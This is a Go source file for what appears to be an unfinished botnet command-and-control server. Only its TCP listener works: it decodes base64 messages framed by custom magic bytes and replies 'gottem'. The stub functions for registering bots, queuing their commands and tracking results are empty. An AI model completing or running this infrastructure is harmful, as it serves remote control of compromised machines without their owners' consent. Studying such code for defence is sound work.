// Shoutout to for a helpful blogpost/example @donutdan4114
package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

// PORT : port to listen on
var PORT = "5656"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = string(MAGICTERM)

func main() {
	portStr := ":" + PORT
	l, err := net.Listen("tcp4", portStr)
	if err != nil {
		os.Exit(1)
	}

	defer l.Close()
	fmt.Println("Listening for Petrie connections on port:" + PORT)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go connHandle(conn)
	}
}

func connHandle(conn net.Conn) {
	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
	decMsg := decodePayload(message)
	fmt.Printf("Incoming Message: %s\n", decMsg)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	resp := MAGICSTR + "gottem" + MAGICTERMSTR
	fmt.Println("sending: " + resp)
	conn.Write([]byte(resp))
	conn.Close()
}

// take buffer from conn handler, turn it into a string
func decodePayload(payload string) string {
	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
	data, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		fmt.Println("error:", err)
		return ""
	}
	return string(data)
}

// take string of payload, depending on mode/arguments: handle it
func handlePayload(payload string) bool {
	return true
}

// take params from bot and register it in the DB
func registerBot(uuid string, hostname string, interval int, delta int) bool {
	return true
}

// pull all commands from DB with associated uuid
func getCommand(uuid string) []string {
	return nil
}

// send the action result back to the DB for feedback tracking
func addResult(result string, actionid int) bool {
	return true
}

// generate the formatted and base64 encoded string, ready to be sent accross wire
func buildPayload(mode string, arguments string, actionid int) string {
	return ""
}

// send payload via defined connection
func sendPayload(conn net.Conn, payload string) bool {
	return true
}
